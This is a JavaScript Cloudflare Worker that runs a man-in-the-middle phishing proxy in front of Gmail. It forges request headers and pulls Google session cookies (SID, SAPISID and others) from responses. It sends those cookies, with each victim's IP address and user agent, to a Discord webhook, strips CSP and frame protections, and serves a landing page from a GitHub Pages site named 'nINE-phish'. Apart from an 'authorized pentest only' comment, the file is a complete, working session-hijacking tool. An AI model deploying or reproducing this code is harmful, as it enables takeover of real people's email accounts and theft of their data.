// COMPLETE Gmail MitM Proxy Worker with Header Spoofing + Cookie Theft
// Deploy as Cloudflare Worker (authorized pentest only)

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  
  // PROXY /mail/* → mail.google.com
  if (url.pathname.startsWith('/mail/') || url.pathname.startsWith('/static/')) {
    // TARGET: mail.google.com
    url.hostname = 'mail.google.com'
    
    // FULL HEADER SPOOFING (bypass CSP/SameSite)
    const headers = new Headers(request.headers)
    headers.set('Origin', 'https://mail.google.com')
    headers.set('Referer', 'https://mail.google.com/mail/u/0/#inbox')
    headers.set('Host', 'mail.google.com')
    headers.set('Sec-Fetch-Site', 'same-origin')
    headers.set('Sec-Fetch-Mode', 'navigate')
    headers.set('Sec-Fetch-Dest', 'document')
    headers.set('User-Agent', request.headers.get('User-Agent') || 'Mozilla/5.0...')
    
    // PROXY REQUEST
    const proxyReq = new Request(url.toString(), {
      method: request.method,
      headers,
      body: request.body,
      redirect: 'manual'
    })
    
    try {
      const response = await fetch(proxyReq)
      
      // INTERCEPT COOKIES (HIGH-VALUE TOKENS)
      const cookies = response.headers.get('Set-Cookie')
      const victimIP = request.headers.get('CF-Connecting-IP') || 'unknown'
      const userAgent = request.headers.get('User-Agent') || 'unknown'
      
      if (cookies) {
        const tokens = cookies.match(/(SID|HSID|SSID|APISID|SAPISID|__Secure-3PSID)=[^;,\s]+/gi) || []
        if (tokens.length > 0) {
          // WEBHOOK TO YOUR DISCORD/SLACK (replace URL)
          const webhookData = {
            content: `🎣 GMAIL TOKENS STOLEN!\nIP: ${victimIP}\nUA: ${userAgent}\nTOKENS: ${tokens.join(', ')}`
          }
          await fetch('https://discord.com/api/webhooks/YOUR-WEBHOOK-URL', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookData)
          }).catch(() => {}) // Silent fail
          
          console.log(`TOKENS: ${tokens.join(', ')} | IP: ${victimIP}`)
        }
      }
      
      // PROXY RESPONSE + BYPASS HEADERS
      const newHeaders = new Headers(response.headers)
      newHeaders.set('Access-Control-Allow-Origin', '*')
      newHeaders.set('Access-Control-Allow-Credentials', 'true')
      newHeaders.delete('Content-Security-Policy')
      newHeaders.delete('X-Frame-Options')
      
      // COOKIES BACK TO VICTIM (RELAXED)
      if (cookies) {
        newHeaders.set('Set-Cookie', cookies.replace(/SameSite=[^;]+/gi, 'SameSite=None; Secure'))
      }
      
      return new Response(response.body, {
        status: response.status,
        statusText: response.statusText,
        headers: newHeaders
      })
      
    } catch (error) {
      return new Response('Proxy Error: ' + error.message, { status: 502 })
    }
  }
  
  // LANDING → FRONTEND
  return fetch('https://ia7353038-crypto.github.io/nINE-phish/')
}
